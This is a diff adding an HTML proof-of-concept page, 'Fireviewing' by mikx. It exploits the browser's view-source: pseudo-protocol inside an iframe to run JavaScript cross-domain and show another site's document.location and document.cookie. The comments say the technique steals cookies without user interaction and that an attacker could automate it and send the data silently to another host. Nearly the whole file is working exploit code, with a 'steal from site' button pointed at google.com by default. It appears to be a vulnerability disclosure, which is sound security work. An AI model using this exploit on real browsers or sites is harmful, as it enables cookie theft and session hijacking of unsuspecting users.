@@ -1,0 +1,44 @@
+<html>
+<head>
+<title>Fireviewing - Proof-of-Concept by mikx</title> 
+<script language="JavaScript" type="text/javascript">
+
+<-- The view-source: pseudo protocol can be used to do cross-domain scripting -->
+<-- without user interaction. This can be used to steal cookies from other -->
+<-- hosts or manipulate the DOM cross-domain. -->
+<-- This PoC will show the given URL in the IFRAME and will raise an alert box -->
+<-- containing the document.location and document.cookie property of that URL -->
+<-- when the page is completly loaded. An attacker could easily automate that -->
+<-- action and send the data silently to another host.
+
+var done = true;
+function stealCookie() {
+if(!done) {
+done = true; 
+stealframe.location = "view-source:javascript:eval(\"alert('
+Location: '+document.location+' \"+String.fromCharCode(92)+\
+"n Cookie: '+document.cookie)\")"
+}
+}
+function setLocation(){
+done = false;
+stealframe.location = document.getElementById("stealurl").value; 
+}
+</script>
+</head>
+<body>
+<div style="font-family:Verdana;font-size:11px;">
+<div style="font-family:Verdana;font-size:15px;font-weight:bold;">Fireviewing</div>
+
+<div style="width:600px">
+<br><br>
+<input id="stealurl" type="text" value="http://www.google.com/" style="width:450px;
+font-family:Arial, Helvetica; font-size:12px;">
+<input type="button" value="steal from site" onclick="setLocation()" 
+style="width:145px; font-family:Arial, Helvetica; font-size:12px;">
+<br>
+<iframe name="stealframe" src="about:blank" onload="stealCookie()" 
+style="width:600px; height:200px;"></iframe>
+</div>
+</body>
+</html>
